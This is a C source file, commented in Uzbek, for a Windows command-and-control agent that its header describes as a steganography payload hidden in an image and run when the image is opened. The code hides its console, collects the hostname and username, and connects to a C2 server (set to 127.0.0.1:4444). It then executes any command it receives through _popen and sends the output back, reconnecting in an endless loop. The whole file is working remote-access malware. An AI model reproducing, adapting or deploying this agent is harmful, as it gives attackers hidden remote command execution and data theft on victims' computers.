/*
 * C2 Agent - Steganography Payload
 * Rasm ichiga yashiriladigan va rasm ochilganda ishlaydigan agent
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// Konfiguratsiya
#define C2_SERVER "127.0.0.1"
#define C2_PORT 4444
#define BUFFER_SIZE 8192
#define SLEEP_TIME 5000
#define MAGIC_MARKER "C2_PAYLOAD_START"

// Agent ma'lumotlari
typedef struct {
    char agent_id[64];
    char hostname[256];
    char username[256];
} AgentInfo;

AgentInfo g_info;

// Tizim ma'lumotlarini yig'ish
void gather_info() {
    DWORD size = sizeof(g_info.hostname);
    GetComputerNameA(g_info.hostname, &size);
    
    size = sizeof(g_info.username);
    GetUserNameA(g_info.username, &size);
    
    sprintf(g_info.agent_id, "%s_%d", g_info.hostname, GetCurrentProcessId());
}

// Buyruqni bajarish
void exec_cmd(const char *cmd, char *output, int max_size) {
    FILE *fp = _popen(cmd, "r");
    if (fp == NULL) {
        strcpy(output, "[!] Command failed");
        return;
    }
    
    memset(output, 0, max_size);
    size_t n = fread(output, 1, max_size - 1, fp);
    output[n] = '\0';
    _pclose(fp);
}

// C2 serverga ulanish
int connect_c2() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    int recv_size;

    // Winsock init
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }

    // Socket yaratish
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }

    // Server manzili
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    server.sin_addr.s_addr = inet_addr(C2_SERVER);

    // Ulanish
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // Agent ID yuborish
    send(sock, g_info.agent_id, strlen(g_info.agent_id), 0);
    Sleep(500);

    // Buyruqlarni kutish
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        recv_size = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        
        if (recv_size <= 0) break;

        buffer[recv_size] = '\0';

        // Maxsus buyruqlar
        if (strcmp(buffer, "exit") == 0) {
            break;
        } 
        else if (strcmp(buffer, "info") == 0) {
            sprintf(output, "Host: %s\nUser: %s\nID: %s", 
                    g_info.hostname, g_info.username, g_info.agent_id);
        } 
        else if (strcmp(buffer, "ping") == 0) {
            strcpy(output, "pong");
        }
        else {
            // Buyruqni bajarish
            exec_cmd(buffer, output, BUFFER_SIZE);
        }

        // Javob yuborish
        send(sock, output, strlen(output), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Konsolni yashirish
    FreeConsole();

    // Tizim ma'lumotlarini yig'ish
    gather_info();

    // C2 ga ulanish (loop)
    while (1) {
        connect_c2();
        Sleep(SLEEP_TIME);
    }

    return 0;
}

// Debug uchun main
int main() {
    gather_info();
    
    while (1) {
        if (connect_c2() == 0) {
            printf("[+] Session completed\n");
        } else {
            printf("[-] Connection failed\n");
        }
        Sleep(SLEEP_TIME);
    }
    
    return 0;
}
